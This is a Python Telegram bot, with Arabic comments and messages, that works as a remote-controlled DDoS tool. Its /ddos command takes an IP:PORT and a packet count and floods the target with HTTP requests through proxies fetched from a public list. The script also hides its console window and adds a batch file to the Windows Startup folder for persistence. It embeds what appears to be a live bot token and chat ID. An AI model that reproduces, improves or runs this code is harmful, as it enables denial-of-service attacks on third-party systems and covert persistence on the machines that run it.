#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# بوت BotECS - نسخة عربية مع aiogram - دعم IP:PORT
# المصدر الأصلي: https://github.com/esfelurm/botecs
# تم التحويل بواسطة: Black 😈

import asyncio
import sys
import os
import socket
import random
import json
import subprocess
from datetime import datetime
from re import findall
from platform import system as sys_platform

from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import Message, FSInputFile
from aiogram.enums import ParseMode
import aiohttp
import aiofiles

from bs4 import BeautifulSoup as Soup

# ===== التوكن والمعلومات =====
TOKEN = '7901707823:AAHexZLWV1PyxEEOO4waHI45OliNUvyWD2c'
CHAT_ID = '8051787133'  # سيتم استخدامه للإشعارات فقط

# ===== إنشاء البوت =====
bot = Bot(token=TOKEN)
dp = Dispatcher()

# ===== متغيرات عامة =====
target_url = None
packet_count = None
proxy_list = []
attack_running = False
current_attack = None

# ===== دالة تحميل البروكسيات =====
async def load_proxies():
    global proxy_list
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get('https://api.openproxylist.xyz/socks5.txt', timeout=10) as resp:
                text = await resp.text()
                proxy_list = text.split()
                await bot.send_message(CHAT_ID, "✅ تم تحميل البروكسيات بنجاح")
                return True
    except:
        await bot.send_message(CHAT_ID, "⚠️ مشكلة في تحميل البروكسيات")
        # بروكسيات احتياطية
        proxy_list = [
            "104.194.62.120:8888", "104.194.60.101:8888", "104.194.60.73:8888",
            "104.194.62.70:8888", "104.194.61.125:8888",
            "45.155.191.234:8080", "45.155.191.203:8080", "45.155.191.115:8080",
            "45.155.191.118:8080", "45.155.191.199:8080"
        ]
        return False

# ===== دالة إضافة البوت إلى بدء التشغيل (ويندوز) =====
def add_to_startup():
    try:
        if 'windows' in sys_platform().lower():
            import win32gui, win32con
            win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)
    except:
        pass
    try:
        if 'windows' in sys_platform().lower():
            location = sys.exec_prefix
            loc = location.split('\\')
            op = []
            for lc in loc[:6]:
                lol = str(lc) + '\\'
                op.append(str(lol))
            startup_path = op[0] + op[1] + op[2] + op[3] + 'Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'
            with open(startup_path + 'BotECS.bat', 'w') as f:
                f.write(f'start {sys.argv[0]}')
    except:
        pass

# ===== كلاس الهجوم =====
class Attack:
    def __init__(self, target: str, proxies: list, packet_num: int):
        self.target = target
        self.proxies = proxies
        self.packet_num = packet_num
        self.num = 0
        
        # استخراج IP والمنفذ
        if ':' in target:
            parts = target.split(':')
            self.target_ip = parts[0]
            self.target_port = int(parts[1])
        else:
            self.target_ip = target
            self.target_port = 80
            
        self.accept_headers = [
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
            "Accept-Encoding: gzip, deflate\r\n",
            "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
            "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
            "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
            "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
            "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
            "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
            "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
            "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
            "Accept: text/html, application/xhtml+xml",
            "Accept-Language: en-US,en;q=0.5\r\n",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
            "Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
        ]

    async def run(self, bot_instance: Bot, chat_id: int) -> bool:
        global attack_running
        attack_running = True
        
        # التحقق من عدد الحزم
        if self.packet_num > 4000:
            await bot_instance.send_message(chat_id, "🔴 الرقم كبير جداً ❌\n🟢 تم ضبطه على 4000")
            self.packet_num = 4000
        elif self.packet_num < 100:
            await bot_instance.send_message(chat_id, "🔴 الرقم أقل من 100 ❌\n🟢 تم ضبطه على 4000")
            self.packet_num = 4000
        
        proxies = self.proxies
        if not proxies:
            await bot_instance.send_message(chat_id, "❌ لا يوجد بروكسيات")
            attack_running = False
            return False
        
        target_ip = self.target_ip
        target_port = self.target_port
        
        await bot_instance.send_message(
            chat_id,
            f"🚀 **بدء الهجوم على**\n"
            f"🎯 `{target_ip}:{target_port}`\n"
            f"📦 عدد الحزم: {self.packet_num}",
            parse_mode=ParseMode.MARKDOWN
        )
        
        sent_count = 0
        target_count = min(self.packet_num, len(proxies) * 10)
        
        for prx in proxies[:target_count]:
            if not attack_running:
                break
            try:
                prx_parts = prx.strip().split(':')
                if len(prx_parts) < 2:
                    continue
                
                # استخدام TCP SYN-like flood
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                
                # محاولة الاتصال بالهدف عبر البروكسي
                sock.connect((prx_parts[0], int(prx_parts[1])))
                
                # إرسال حزم TCP SYN (محاكاة)
                for _ in range(5):
                    if not attack_running:
                        break
                    try:
                        # إرسال طلب HTTP بسيط أو حزمة عشوائية
                        payload = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nConnection: keep-alive\r\n\r\n"
                        sock.send(payload.encode())
                        sent_count += 1
                    except:
                        pass
                sock.close()
            except:
                pass
            
            # تحديثات
            if sent_count >= 200 and sent_count % 200 < 10:
                await bot_instance.send_message(chat_id, f"🟠 {sent_count} حزمة تم إرسالها")
            elif sent_count >= 600 and sent_count % 400 < 10:
                await bot_instance.send_message(chat_id, f"🟡 {sent_count} حزمة تم إرسالها")
            elif sent_count >= 1200 and sent_count % 600 < 10:
                await bot_instance.send_message(chat_id, f"🔵 {sent_count} حزمة تم إرسالها")
            elif sent_count >= 2200 and sent_count % 800 < 10:
                await bot_instance.send_message(chat_id, f"🟣 {sent_count} حزمة تم إرسالها")
            
            if sent_count >= self.packet_num:
                break
        
        await bot_instance.send_message(
            chat_id,
            f"✅ **انتهى الهجوم** 🧨\n"
            f"🎯 الهدف: `{target_ip}:{target_port}`\n"
            f"📦 عدد الحزم: {sent_count}",
            parse_mode=ParseMode.MARKDOWN
        )
        attack_running = False
        return True

# ===== أوامر البوت =====
@dp.message(Command("start"))
async def cmd_start(message: Message):
    user = message.from_user
    welcome_text = (
        "🤖 **بوت BotECS - النسخة العربية**\n\n"
        "🔹 **الأوامر المتاحة:**\n"
        "`/ddos <IP:PORT> <عدد الحزم>` - شن هجوم\n"
        "`/status` - حالة الهجوم الحالي\n"
        "`/stop` - إيقاف الهجوم\n"
        "`/help` - المساعدة\n\n"
        "📌 **مثال:**\n"
        "`/ddos 1.1.1.1:80 2000`\n\n"
        "⚡️ الحد الأدنى: 100 | الحد الأقصى: 4000"
    )
    await message.reply(welcome_text, parse_mode=ParseMode.MARKDOWN)

@dp.message(Command("help"))
async def cmd_help(message: Message):
    help_text = (
        "📖 **مساعدة بوت BotECS**\n\n"
        "🔹 `/ddos <IP:PORT> <عدد>`\n"
        "   يشن هجوماً على الـ IP والمنفذ المحددين\n"
        "   مثال: `/ddos 1.1.1.1:80 2000`\n\n"
        "🔹 `/status`\n"
        "   يعرض حالة الهجوم الحالي\n\n"
        "🔹 `/stop`\n"
        "   يوقف الهجوم الجاري\n\n"
        "🔹 `/start`\n"
        "   يعرض القائمة الرئيسية\n\n"
        "🔹 `/help`\n"
        "   يعرض هذه المساعدة"
    )
    await message.reply(help_text, parse_mode=ParseMode.MARKDOWN)

@dp.message(Command("ddos"))
async def cmd_ddos(message: Message):
    global target_url, packet_count, current_attack, attack_running
    
    if attack_running:
        await message.reply("⚠️ **يوجد هجوم قيد التشغيل حالياً!**\nاستخدم `/stop` لإيقافه أولاً.", parse_mode=ParseMode.MARKDOWN)
        return
    
    parts = message.text.split()
    if len(parts) < 3:
        await message.reply(
            "❌ **صيغة خاطئة!**\n"
            "الصيغة الصحيحة:\n"
            "`/ddos <IP:PORT> <عدد الحزم>`\n"
            "مثال: `/ddos 1.1.1.1:80 2000`",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    target = parts[1]
    try:
        packet_num = int(parts[2])
    except:
        await message.reply("❌ عدد الحزم يجب أن يكون رقماً!")
        return
        
    if packet_num < 100 or packet_num > 4000:
        await message.reply(f"❌ عدد الحزم يجب أن يكون بين 100 و 4000\nأنت أرسلت: {packet_num}")
        return
    
    # التحقق من صيغة IP:PORT
    if ':' not in target:
        await message.reply("❌ **صيغة غير صحيحة!**\nاستخدم `IP:PORT`\nمثال: `1.1.1.1:80`")
        return
    
    ip_part, port_part = target.split(':')
    try:
        port = int(port_part)
        if not (1 <= port <= 65535):
            raise ValueError
    except:
        await message.reply("❌ المنفذ (PORT) يجب أن يكون رقماً بين 1 و 65535")
        return
    
    # التحقق من صحة الـ IP
    try:
        socket.gethostbyname(ip_part)
    except:
        await message.reply(f"❌ الـ IP `{ip_part}` غير صالح!")
        return
    
    await message.reply(
        f"🎯 **تم استلام الهدف:**\n`{target}`\n"
        f"📦 **عدد الحزم:** {packet_num}\n"
        f"⏳ جارٍ التحضير...",
        parse_mode=ParseMode.MARKDOWN
    )
    
    target_url = target
    packet_count = packet_num
    
    # تشغيل الهجوم
    attack = Attack(target, proxy_list, packet_num)
    current_attack = attack
    await attack.run(bot, message.chat.id)

@dp.message(Command("status"))
async def cmd_status(message: Message):
    global attack_running, target_url, packet_count
    
    if attack_running:
        await message.reply(
            f"⚡ **حالة الهجوم:** قيد التشغيل\n"
            f"🎯 **الهدف:** `{target_url}`\n"
            f"📦 **عدد الحزم:** {packet_count}",
            parse_mode=ParseMode.MARKDOWN
        )
    else:
        await message.reply("⏸️ **لا يوجد هجوم قيد التشغيل حالياً.**")

@dp.message(Command("stop"))
async def cmd_stop(message: Message):
    global attack_running
    
    if attack_running:
        attack_running = False
        await message.reply("🛑 **تم إيقاف الهجوم بنجاح!**")
    else:
        await message.reply("ℹ️ لا يوجد هجوم قيد التشغيل.")

@dp.message()
async def handle_all_messages(message: Message):
    # معالجة الرسائل النصية العادية كأوامر هجوم
    global attack_running
    
    if attack_running:
        await message.reply("⚠️ يوجد هجوم قيد التشغيل حالياً!")
        return
        
    # محاولة استخراج IP:PORT وعدد من الرسالة
    parts = message.text.split()
    if len(parts) >= 2:
        target = parts[0]
        if ':' in target:
            try:
                packet_num = int(parts[1])
                if 100 <= packet_num <= 4000:
                    # محاكاة أمر /ddos
                    msg = message
                    msg.text = f"/ddos {target} {packet_num}"
                    await cmd_ddos(msg)
                    return
            except:
                pass
    
    await message.reply(
        "❌ **أمر غير معروف**\n"
        "استخدم `/start` لعرض الأوامر المتاحة."
    )

# ===== تشغيل البوت =====
async def main():
    print("\n" + "="*50)
    print("  BOTECS - النسخة العربية (aiogram)")
    print("  دعم IP:PORT - تم التحويل بواسطة: Black 😈")
    print("="*50 + "\n")
    
    add_to_startup()
    await load_proxies()
    
    print("🤖 البوت يعمل الآن...")
    print("💡 استخدم /start في البوت")
    print("="*50 + "\n")
    
    try:
        await bot.send_message(CHAT_ID, "🟢 **تم تشغيل بوت BotECS (نسخة عربية - IP:PORT)**\nباستخدام مكتبة aiogram")
    except:
        pass
    
    await dp.start_polling(bot)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n🛑 تم إيقاف البوت بواسطة المستخدم")
    except Exception as e:
        print(f"❌ خطأ: {e}")